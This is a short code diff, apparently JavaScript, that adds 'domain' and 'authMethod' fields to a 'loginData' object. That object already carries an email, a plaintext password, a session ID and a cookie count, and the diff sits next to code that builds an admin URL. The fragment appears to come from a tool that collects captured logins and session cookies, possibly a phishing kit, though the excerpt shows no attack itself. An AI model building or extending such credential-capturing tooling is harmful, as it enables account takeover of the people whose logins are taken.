@@ -323,7 +323,7 @@ ${adminUrl}
             return;
         }
 
-        const { email, timestamp, totalCookies, sessionId, password } = loginData;
+        const { email, timestamp, totalCookies, sessionId, password, domain, authMethod } = loginData;
         // Construct admin URL - support Replit, VPS with domain, or extract from redirect URI
         let baseUrl;
         if (process.env.REPL_SLUG) {
